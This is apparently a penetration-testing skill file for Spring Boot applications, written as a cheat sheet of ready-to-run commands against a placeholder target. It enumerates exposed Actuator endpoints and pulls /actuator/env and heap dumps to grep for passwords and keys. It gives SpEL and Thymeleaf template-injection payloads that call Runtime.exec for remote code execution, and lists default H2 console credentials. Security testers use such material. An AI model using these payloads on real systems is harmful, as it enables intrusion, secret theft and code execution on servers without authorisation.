---
name: spring-boot
description: Spring Boot security testing covering Actuator exposure, SpEL injection, Thymeleaf SSTI, H2 console, and bean manipulation
---

# Spring Boot Security Testing

## Key Vulnerabilities

### Actuator Endpoints

```bash
# Spring Boot Actuator — often exposed without auth
for ep in actuator actuator/env actuator/health actuator/info actuator/beans actuator/mappings \
  actuator/configprops actuator/metrics actuator/trace actuator/httptrace actuator/heapdump \
  actuator/threaddump actuator/loggers actuator/conditions actuator/shutdown; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET/$ep")
  [ "$code" != "404" ] && [ "$code" != "401" ] && echo "[$code] /$ep"
done

# /actuator/env — reveals ALL environment variables (database passwords, API keys)
curl -sk "https://TARGET/actuator/env" | python3 -m json.tool | head -100

# /actuator/heapdump — JVM heap dump (contains credentials in memory)
curl -sk "https://TARGET/actuator/heapdump" -o heapdump.hprof
# Analyze: strings heapdump.hprof | grep -i password

# /actuator/mappings — reveals ALL URL endpoints
curl -sk "https://TARGET/actuator/mappings" | python3 -m json.tool
```

### SpEL Injection (Spring Expression Language)

```bash
# Test SpEL injection in parameters
curl -sk "https://TARGET/page?input=#{7*7}" | grep "49"
curl -sk "https://TARGET/page?input=#{T(java.lang.Runtime).getRuntime().exec('id')}"

# Via error messages
curl -sk "https://TARGET/page?input=%23{T(java.lang.Runtime).getRuntime().exec('id')}"
```

### Thymeleaf SSTI

```bash
# Thymeleaf template injection
curl -sk "https://TARGET/page?name=__\${T(java.lang.Runtime).getRuntime().exec('id')}__::.x"
curl -sk "https://TARGET/page?lang=::__\${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}__::.x"
```

### H2 Console

```bash
# H2 database console (dev mode)
curl -sk "https://TARGET/h2-console/" | grep -i "h2"
# Default: sa / (empty password), or sa / sa
# Once in → execute arbitrary SQL, read files, RCE via ALIAS
```

## Pro Tips

1. `/actuator/env` is the #1 Spring Boot vulnerability — it exposes ALL secrets
2. `/actuator/heapdump` contains live memory — grep for passwords, tokens, keys
3. SpEL injection through `#{}` expressions can achieve RCE — test every parameter
4. Thymeleaf SSTI uses `__${...}__::` syntax — different from Jinja2/Twig SSTI
5. H2 console on `/h2-console` with default credentials = instant database access
6. Check `/actuator/mappings` for a complete map of ALL API endpoints
